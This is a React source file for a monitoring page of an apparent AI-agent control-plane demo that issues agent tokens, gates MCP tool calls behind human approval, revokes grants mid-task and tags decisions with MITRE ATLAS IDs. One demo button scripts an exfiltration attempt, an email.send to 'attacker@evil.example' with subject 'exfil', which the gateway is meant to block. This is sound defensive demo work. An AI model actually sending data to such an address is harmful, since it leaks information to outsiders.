import { useCallback, useEffect, useMemo, useState } from "react";
import { Link, useSearchParams } from "react-router-dom";
import Layout from "../components/Layout";
import StorageStatus from "../components/StorageStatus/StorageStatus";
import { ApiError } from "../lib/api";
import { agentsApi as api } from "../lib/agentsApi";
import {
  describeError,
  kindLabel,
  sendsEmail,
  typeAllows,
  type Agent,
  type AgentType,
  type AuditEvent,
  type Tool,
} from "../lib/agents";
import EmailSetup, { NoEmailNote, emailSetupPath } from "./EmailSetup";
import RunTask from "./RunTask";
import "./Agents.css";
import "./Monitoring.css";

const DEMO_AGENT = "agent-comms-01";

interface AtlasEntry {
  id: string;
  name?: string;
}

interface Matrix {
  atlas_version: string;
  techniques?: AtlasEntry[];
  mitigations?: AtlasEntry[];
}

interface Flash {
  kind: "ok" | "deny" | "info";
  title: string;
  body: string;
  link?: { to: string; label: string };
  technique_ids?: string[];
  mitigation_ids?: string[];
}

const errText = (e: unknown) => (e instanceof Error ? e.message : String(e));

export default function Monitoring() {
  const [params, setParams] = useSearchParams();
  const [agents, setAgents] = useState<Agent[]>([]);
  const [types, setTypes] = useState<AgentType[]>([]);
  const [tools, setTools] = useState<Tool[]>([]);
  const [audit, setAudit] = useState<AuditEvent[]>([]);
  const [matrix, setMatrix] = useState<Matrix | null>(null);
  const [token, setToken] = useState<string | null>(null);
  // Trace id of the current token's calls in the activity log.
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [flash, setFlash] = useState<Flash | null>(null);
  const [busy, setBusy] = useState(false);
  const [lastResult, setLastResult] = useState<unknown>(null);
  const [atlasVersion, setAtlasVersion] = useState("");

  // ?agent=<id> picks the agent; otherwise the shared demo agent.
  const selectedId = params.get("agent") || DEMO_AGENT;
  const agent = useMemo(
    () =>
      agents.find((a) => a.agent_id === selectedId) ||
      agents.find((a) => a.agent_id === DEMO_AGENT) ||
      agents[0],
    [agents, selectedId],
  );
  const agentType = useMemo(() => types.find((t) => t.kind === agent?.kind), [types, agent?.kind]);

  // A workload token belongs to one agent: drop it when switching agents.
  useEffect(() => {
    setToken(null);
    setSessionId(null);
    setLastResult(null);
  }, [agent?.agent_id]);

  const refresh = useCallback(async () => {
    const [a, ty, t, au, m] = await Promise.all([
      api.agents(),
      api.agentTypes(),
      api.tools(),
      api.audit(),
      api.matrix(),
    ]);
    setAgents(a);
    setTypes(ty);
    setTools(t);
    setAudit(au);
    setMatrix(m);
    setAtlasVersion(m.atlas_version);
  }, []);

  useEffect(() => {
    refresh().catch((e) =>
      setFlash({
        kind: "deny",
        title: "Gateway unreachable",
        body: errText(e),
      }),
    );
    const id = window.setInterval(() => {
      api.audit().then(setAudit).catch(() => {});
      api.agents().then(setAgents).catch(() => {});
    }, 2500);
    return () => window.clearInterval(id);
  }, [refresh]);

  async function authenticate() {
    if (!agent) return;
    setBusy(true);
    try {
      const res = await api.mintAgentToken(agent.agent_id);
      setToken(res.access_token);
      setSessionId(res.session_id || null);
      setFlash({
        kind: "ok",
        title: "Agent authenticated",
        body: res.atlas?.narrative || "Workload token issued.",
        mitigation_ids: ["AML.M0028", "AML.M0024"],
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Auth failed", body: describeError(e, types) });
    } finally {
      setBusy(false);
    }
  }

  async function runTool(tool: string, args: Record<string, unknown>) {
    if (!token) {
      setFlash({
        kind: "info",
        title: "Authenticate first",
        body: "Issue a workload token before calling tools.",
      });
      return;
    }
    setBusy(true);
    try {
      const res = await api.callTool(token, tool, args);
      setLastResult(res.result);
      if (res.decision === "pending_approval") {
        setFlash({
          kind: "info",
          title: `${tool} is waiting for approval`,
          body: "Nothing was sent. A person has to approve it first; edits are allowed.",
          mitigation_ids: res.atlas?.mitigation_ids,
          link: { to: "/approvals", label: "Review on the Approvals page" },
        });
        await refresh();
        return;
      }
      setFlash({
        kind: "ok",
        title: `Allowed ${tool}`,
        body: res.atlas?.narrative || "Allowed",
        technique_ids: res.atlas?.technique_ids,
        mitigation_ids: res.atlas?.mitigation_ids,
      });
      await refresh();
    } catch (e) {
      const detail = e instanceof ApiError ? (e.data as { detail?: unknown } | null)?.detail : null;
      const atlas =
        detail && typeof detail === "object"
          ? (detail as {
              error?: string;
              message?: string;
              technique_ids?: string[];
              mitigation_ids?: string[];
              atlas?: { narrative?: string; technique_ids?: string[]; mitigation_ids?: string[] };
            })
          : null;
      setLastResult(detail ?? { error: errText(e) });
      setFlash({
        kind: "deny",
        title:
          atlas?.error === "tool_not_allowed_for_kind"
            ? describeError(e, types)
            : atlas?.message || `Denied ${tool}`,
        body: atlas?.atlas?.narrative || errText(e) || "Request blocked",
        technique_ids: atlas?.atlas?.technique_ids || atlas?.technique_ids,
        mitigation_ids: atlas?.atlas?.mitigation_ids || atlas?.mitigation_ids,
      });
      await refresh();
    } finally {
      setBusy(false);
    }
  }

  async function revoke(tool: string) {
    if (!agent) return;
    setBusy(true);
    try {
      const res = await api.revokeTool(agent.agent_id, tool);
      setFlash({
        kind: "info",
        title: `Revoked ${tool}`,
        body: res.message || "Grant revoked.",
        technique_ids: res.atlas?.technique_ids,
        mitigation_ids: res.atlas?.mitigation_ids,
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Revoke failed", body: describeError(e, types) });
    } finally {
      setBusy(false);
    }
  }

  async function restore(tool: string) {
    if (!agent) return;
    setBusy(true);
    try {
      await api.grantTool(agent.agent_id, tool);
      setFlash({
        kind: "ok",
        title: `Restored ${tool}`,
        body: "Grant re-added under AML.M0028.",
        mitigation_ids: ["AML.M0028"],
      });
      await refresh();
    } catch (e) {
      setFlash({ kind: "deny", title: "Restore failed", body: describeError(e, types) });
    } finally {
      setBusy(false);
    }
  }

  return (
    <Layout>
      <div className="monitoring-console">
        <div className="shell">
          <header className="top">
            <div className="brand-block">
              <p className="eyebrow">Prompt 1 · Agentic identity</p>
              <h1>Monitoring</h1>
              <p className="tagline">
                Authenticate an agent, allow MCP tools, revoke mid-task — MITRE ATLAS on every decision.
              </p>
            </div>
            <div className="meta">
              <span className="pill">ATLAS {atlasVersion || "…"}</span>
              <span className={`pill ${token ? "on" : ""}`}>
                {token ? "Token live" : "Unauthenticated"}
              </span>
              <StorageStatus compact />
            </div>
          </header>

          {flash && (
            <div className={`flash flash-${flash.kind}`} role="status">
              <strong>{flash.title}</strong>
              <p>
                {flash.body}
                {flash.link && (
                  <>
                    {" "}
                    <Link to={flash.link.to}>{flash.link.label}</Link>
                  </>
                )}
              </p>
              <div className="id-row">
                {(flash.technique_ids || []).map((id) => (
                  <code key={id} className="tech">
                    {id}
                  </code>
                ))}
                {(flash.mitigation_ids || []).map((id) => (
                  <code key={id} className="mit">
                    {id}
                  </code>
                ))}
              </div>
            </div>
          )}

          <div className="grid">
            <section className="panel identity">
              <h2>Workload identity</h2>
              {agent ? (
                <>
                  <div className="agent-picker">
                    <label htmlFor="agent-select">Agent</label>
                    <select
                      id="agent-select"
                      value={agent.agent_id}
                      onChange={(e) => setParams({ agent: e.target.value })}
                    >
                      {agents.map((a) => (
                        <option key={a.agent_id} value={a.agent_id}>
                          {a.name} · {kindLabel(types, a.kind)}
                        </option>
                      ))}
                    </select>
                    <Link to="/agents/new">New agent</Link>
                  </div>
                  <dl>
                    <div>
                      <dt>Type</dt>
                      <dd>
                        <span className={`kind-badge kind-${agent.kind}`}>
                          {kindLabel(types, agent.kind)}
                        </span>
                      </dd>
                    </div>
                    <div>
                      <dt>Agent</dt>
                      <dd>{agent.name}</dd>
                    </div>
                    <div>
                      <dt>Agency</dt>
                      <dd>{agent.agency}</dd>
                    </div>
                    <div>
                      <dt>ID</dt>
                      <dd>
                        <code>{agent.agent_id}</code>
                      </dd>
                    </div>
                    <div>
                      <dt>Token version</dt>
                      <dd>{agent.token_version}</dd>
                    </div>
                  </dl>
                  <button className="primary" type="button" disabled={busy} onClick={authenticate}>
                    Authenticate agent
                  </button>
                  <h3>Tool grants</h3>
                  <ul className="grants">
                    {tools.map((t) => {
                      const granted = agent.tool_grants.includes(t.name);
                      const allowed = typeAllows(agentType, t.name);
                      return (
                        <li key={t.name}>
                          <div>
                            <code>{t.name}</code>
                            <span className={`risk risk-${t.risk_level}`}>{t.risk_level}</span>
                            <p>{t.description}</p>
                            <div className="id-row compact">
                              {(t.atlas_techniques || []).map((id) => (
                                <code key={id} className="tech">
                                  {id}
                                </code>
                              ))}
                            </div>
                          </div>
                          <div className="grant-actions">
                            <span className={granted ? "yes" : "no"}>
                              {granted ? "granted" : allowed ? "revoked" : "not allowed"}
                            </span>
                            {!allowed && !granted ? (
                              <span className="locked" title={`Outside the ${agentType?.label ?? agent.kind} type`}>
                                Locked by type
                              </span>
                            ) : granted ? (
                              <button type="button" disabled={busy} onClick={() => revoke(t.name)}>
                                Revoke
                              </button>
                            ) : (
                              <button type="button" disabled={busy} onClick={() => restore(t.name)}>
                                Restore
                              </button>
                            )}
                          </div>
                        </li>
                      );
                    })}
                  </ul>
                </>
              ) : (
                <p>Loading agent…</p>
              )}
            </section>

            <section className="panel email-panel">
              <div className="email-panel-head">
                <h2>Email setup</h2>
                {agent && sendsEmail(agent) && (
                  <Link to={emailSetupPath(agent.agent_id)}>Open on My agents</Link>
                )}
              </div>
              {!agent ? (
                <p>Loading agent…</p>
              ) : sendsEmail(agent) ? (
                <EmailSetup
                  key={agent.agent_id}
                  agent={agent}
                  onSaved={(updated) =>
                    setAgents((list) => list.map((x) => (x.agent_id === updated.agent_id ? updated : x)))
                  }
                />
              ) : (
                <NoEmailNote agent={agent} types={types} />
              )}
            </section>

            <section className="panel run-panel">
              <h2>Run a task</h2>
              <p className="hint">
                Give the agent a task in plain words and watch each tool call it makes. Anything it wants to send
                waits on the <Link to="/approvals">Approvals</Link> page.
              </p>
              {agent ? <RunTask key={agent.agent_id} agent={agent} /> : <p>Loading agent…</p>}
            </section>

            <section className="panel actions">
              <h2>Agent task (MCP calls)</h2>
              <p className="hint">
                Demo path: datagov → email (held for <Link to="/approvals">approval</Link>,{" "}
                <code>AML.M0029</code>) → scrape (untrusted page) → email again with 2 (blocked: this session read
                untrusted content, <code>AML.M0030</code>) → revoke <code>email.send</code> → retry (blocked as{" "}
                <code>AML.T0053</code>).
              </p>
              <div className="action-row">
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() => runTool("datagov.search", { q: "public health" })}
                >
                  1. datagov.search
                </button>
                <button
                  type="button"
                  className="primary"
                  disabled={busy || !token}
                  onClick={() =>
                    runTool("email.send", {
                      to: "constituent@example.gov",
                      subject: "Town hall reminder",
                      body: "Join us Tuesday at City Hall.",
                    })
                  }
                >
                  2. email.send
                </button>
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() => runTool("web.scrape", { url: "https://www.usa.gov" })}
                >
                  3. web.scrape
                </button>
                <button
                  type="button"
                  className="danger"
                  disabled={busy || !agent}
                  onClick={() => revoke("email.send")}
                >
                  4. Revoke email.send
                </button>
                <button
                  type="button"
                  disabled={busy || !token}
                  onClick={() =>
                    runTool("email.send", {
                      to: "attacker@evil.example",
                      subject: "exfil",
                      body: "should be blocked",
                    })
                  }
                >
                  5. Retry email.send
                </button>
              </div>
              <h3>Last tool result</h3>
              <pre className="result">{JSON.stringify(lastResult, null, 2) || "—"}</pre>
            </section>

            <aside className="panel atlas">
              <h2>ATLAS Agentic strip</h2>
              <p className="hint">
                Techniques the control plane is defending; mitigations HomeFront labels in audit.
              </p>
              <h3>Techniques</h3>
              <ul className="matrix-list">
                {(matrix?.techniques || []).map((t) => (
                  <li key={t.id}>
                    <code className="tech">{t.id}</code>
                    <span>{t.name || "—"}</span>
                  </li>
                ))}
              </ul>
              <h3>Mitigations</h3>
              <ul className="matrix-list">
                {(matrix?.mitigations || []).map((m) => (
                  <li key={m.id}>
                    <code className="mit">{m.id}</code>
                    <span>{m.name || "—"}</span>
                  </li>
                ))}
              </ul>
            </aside>

            <section className="panel audit">
              <div className="audit-title">
                <h2>Audit stream · AML.M0024</h2>
                <div className="audit-links">
                  {sessionId && (
                    <Link to={`/activity?trace=${encodeURIComponent(sessionId)}`}>Trace this session</Link>
                  )}
                  {agent && (
                    <Link to={`/activity?agent=${encodeURIComponent(agent.agent_id)}`}>Full activity log</Link>
                  )}
                </div>
              </div>
              <ul className="audit-list">
                {audit.map((ev) => (
                  <li key={ev.id} className={`dec-${ev.decision}`}>
                    <div className="audit-head">
                      <span className="decision">{ev.decision}</span>
                      <span>{ev.type}</span>
                      <code>{ev.tool || "—"}</code>
                      <time>{new Date(ev.ts * 1000).toLocaleTimeString()}</time>
                    </div>
                    <p>{ev.atlas?.narrative}</p>
                    <div className="id-row compact">
                      {(ev.atlas?.technique_ids || []).map((id) => (
                        <code key={id} className="tech">
                          {id}
                        </code>
                      ))}
                      {(ev.atlas?.mitigation_ids || []).map((id) => (
                        <code key={id} className="mit">
                          {id}
                        </code>
                      ))}
                    </div>
                  </li>
                ))}
                {audit.length === 0 && <li>No events yet — authenticate to begin.</li>}
              </ul>
            </section>
          </div>
        </div>
      </div>
    </Layout>
  );
}
